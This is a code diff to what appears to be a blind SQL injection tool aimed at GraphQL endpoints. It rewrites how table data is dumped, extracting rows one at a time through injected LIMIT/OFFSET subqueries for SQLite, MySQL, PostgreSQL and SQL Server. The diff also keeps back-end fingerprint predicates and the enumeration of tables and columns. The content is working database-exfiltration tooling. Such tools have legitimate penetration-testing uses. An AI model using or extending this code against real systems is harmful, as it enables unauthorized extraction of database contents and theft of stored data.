@@ -39,8 +39,13 @@ SENTINEL = randomStr(length=10, lowercase=True)
 # Maximum characters recovered for a single blind-inferred scalar (banner, user, table list, ...)
 MAX_LENGTH = 1024
 
-# Higher ceiling for a whole-table dump (its rows are concatenated into one scalar before extraction)
+# Ceiling for a single row's concatenated cells (one row is extracted per request, so
+# this need not hold a whole table; a GROUP_CONCAT of the whole table would be silently
+# capped by the back-end - notably MySQL's group_concat_max_len=1024 - hence per-row).
 DUMP_MAX_LENGTH = 8192
+
+# Maximum number of rows dumped per table (bounds a runaway blind dump)
+DUMP_MAX_ROWS = 1000
 
 # Printable-ASCII codepoint bounds for blind character inference
 CHAR_MIN = 0x20
@@ -49,9 +54,8 @@ CHAR_MAX = 0x7e
 # Number of independent predicates packed into a single aliased GraphQL document (batched inference)
 BATCH_SIZE = 40
 
-# Column/row separators woven into a GROUP_CONCAT/STRING_AGG table dump (printable, improbable in data)
+# Cell separator woven into a per-row dump scalar (printable, improbable in data)
 COL_SEP = "~~~"
-ROW_SEP = "^^^"
 
 # GraphQL scalar types mapped to injection strategy (None = skip)
 SCALAR_STRATEGY = {
@@ -85,35 +89,35 @@ _inputFields = {}
 # established on a slot. `fingerprint` is a predicate true only on that back-end (it errors -> falsy
 # elsewhere). `length`/`ordinal` render a scalar-extraction sub-expression. `delay` wraps a condition
 # in an inline conditional sleep (None where the engine offers none, e.g. SQLite). `banner`/
-# `currentUser`/`currentDb`/`tables` are generic enumeration scalars; `columns`/`rows` build the
-# per-table column list and a single-scalar dump of every row (cells joined COL_SEP, rows ROW_SEP).
+# `currentUser`/`currentDb`/`tables` are generic enumeration scalars; `columns` builds the per-table
+# column list and `row(columns, table, offset)` a single row's cells joined by COL_SEP.
 Dialect = namedtuple("Dialect", ("fingerprint", "length", "ordinal", "delay",
                                  "banner", "currentUser", "currentDb",
-                                 "tables", "columns", "rows"))
+                                 "tables", "columns", "row"))
 
 
-def _sqliteRows(columns, table):
-    cells = ["COALESCE(CAST(%s AS TEXT),'NULL')" % _ for _ in columns]
-    body = ("||'%s'||" % COL_SEP).join(cells)
-    return "(SELECT GROUP_CONCAT(%s,'%s') FROM %s)" % (body, ROW_SEP, table)
+# A row is extracted one at a time by ordinal position (LIMIT/OFFSET). Concatenating
+# the whole table into a single GROUP_CONCAT/STRING_AGG scalar would be silently
+# truncated by the back-end (MySQL caps group_concat_max_len at 1024 bytes), dropping
+# rows without warning; per-row extraction is unbounded and dialect-uniform.
+def _sqliteRow(columns, table, offset):
+    body = ("||'%s'||" % COL_SEP).join("COALESCE(CAST(%s AS TEXT),'NULL')" % _ for _ in columns)
+    return "(SELECT %s FROM %s LIMIT 1 OFFSET %d)" % (body, table, offset)
 
 
-def _mysqlRows(columns, table):
-    cells = ["COALESCE(CAST(%s AS CHAR),'NULL')" % _ for _ in columns]
-    body = "CONCAT_WS('%s',%s)" % (COL_SEP, ",".join(cells))
-    return "(SELECT GROUP_CONCAT(%s SEPARATOR '%s') FROM %s)" % (body, ROW_SEP, table)
+def _mysqlRow(columns, table, offset):
+    body = "CONCAT_WS('%s',%s)" % (COL_SEP, ",".join("COALESCE(CAST(%s AS CHAR),'NULL')" % _ for _ in columns))
+    return "(SELECT %s FROM %s LIMIT %d,1)" % (body, table, offset)
 
 
-def _pgsqlRows(columns, table):
-    cells = ["COALESCE(CAST(%s AS TEXT),'NULL')" % _ for _ in columns]
-    body = ("||'%s'||" % COL_SEP).join(cells)
-    return "(SELECT STRING_AGG(%s,'%s') FROM %s)" % (body, ROW_SEP, table)
+def _pgsqlRow(columns, table, offset):
+    body = ("||'%s'||" % COL_SEP).join("COALESCE(CAST(%s AS TEXT),'NULL')" % _ for _ in columns)
+    return "(SELECT %s FROM %s LIMIT 1 OFFSET %d)" % (body, table, offset)
 
 
-def _mssqlRows(columns, table):
-    cells = ["COALESCE(CAST(%s AS VARCHAR(MAX)),'NULL')" % _ for _ in columns]
-    body = ("+'%s'+" % COL_SEP).join(cells)
-    return "(SELECT STRING_AGG(%s,'%s') FROM %s)" % (body, ROW_SEP, table)
+def _mssqlRow(columns, table, offset):
+    body = ("+'%s'+" % COL_SEP).join("COALESCE(CAST(%s AS VARCHAR(MAX)),'NULL')" % _ for _ in columns)
+    return "(SELECT %s FROM %s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)" % (body, table, offset)
 
 
 DIALECTS = OrderedDict((
@@ -127,7 +131,7 @@ DIALECTS = OrderedDict((
         currentDb=None,
         tables="(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')",
         columns=lambda table: "(SELECT GROUP_CONCAT(name) FROM pragma_table_info('%s'))" % table,
-        rows=_sqliteRows)),
+        row=_sqliteRow)),
     ("Microsoft SQL Server", Dialect(
         fingerprint="@@VERSION LIKE '%Microsoft%'",
         length=lambda expr: "LEN((%s))" % expr,
@@ -138,7 +142,7 @@ DIALECTS = OrderedDict((
         currentDb="DB_NAME()",
         tables="(SELECT STRING_AGG(name,',') FROM sys.tables)",
         columns=lambda table: "(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('%s'))" % table,
-        rows=_mssqlRows)),
+        row=_mssqlRow)),
     ("PostgreSQL", Dialect(
         fingerprint="(SELECT version()) LIKE 'PostgreSQL%'",
         length=lambda expr: "LENGTH((%s))" % expr,
@@ -149,7 +153,7 @@ DIALECTS = OrderedDict((
         currentDb="CURRENT_DATABASE()",
         tables="(SELECT STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_schema='public')",
         columns=lambda table: "(SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='%s')" % table,
-        rows=_pgsqlRows)),
+        row=_pgsqlRow)),
     ("MySQL", Dialect(
         fingerprint="@@VERSION_COMMENT IS NOT NULL",
         length=lambda expr: "CHAR_LENGTH((%s))" % expr,
@@ -160,7 +164,7 @@ DIALECTS = OrderedDict((
         currentDb="DATABASE()",
         tables="(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())",
         columns=lambda table: "(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='%s')" % table,
-        rows=_mysqlRows)),
+        row=_mysqlRow)),
 ))
 
 
@@ -904,18 +908,32 @@ def _inferrer(truth, truthBatch, dialect):
 
 
 def _dumpTable(infer, dialect, table):
-    # Enumerate a table's columns, then recover every row as one concatenated scalar
-    # and split it back into a (columns, rows) grid
+    # Enumerate a table's columns, then recover its rows ONE AT A TIME by ordinal
+    # position. A whole-table GROUP_CONCAT/STRING_AGG would be silently truncated by
+    # the back-end (e.g. MySQL group_concat_max_len=1024), dropping rows; per-row
+    # extraction has no such cap.
     columnsRaw = infer(dialect.columns(table))
     columns = [_ for _ in (columnsRaw or "").split(",") if _]
     if not columns:
         return None
 
-    raw = infer(dialect.rows(columns, table), DUMP_MAX_LENGTH)
+    countRaw = infer("(SELECT COUNT(*) FROM %s)" % table)
+    try:
+        count = int((countRaw or "").strip())
+    except ValueError:
+        count = 0
+
     rows = []
-    for record in (raw or "").split(ROW_SEP) if raw else []:
-        cells = record.split(COL_SEP)
+    for offset in xrange(min(count, DUMP_MAX_ROWS)):
+        raw = infer(dialect.row(columns, table, offset), DUMP_MAX_LENGTH)
+        if raw is None:
+            continue
+        cells = raw.split(COL_SEP)
         rows.append((cells + [""] * len(columns))[:len(columns)])
+
+    if count > DUMP_MAX_ROWS:
+        logger.warning("table '%s' has %d rows; dumping the first %d (DUMP_MAX_ROWS cap)" % (table, count, DUMP_MAX_ROWS))
+
     return columns, rows
 
 
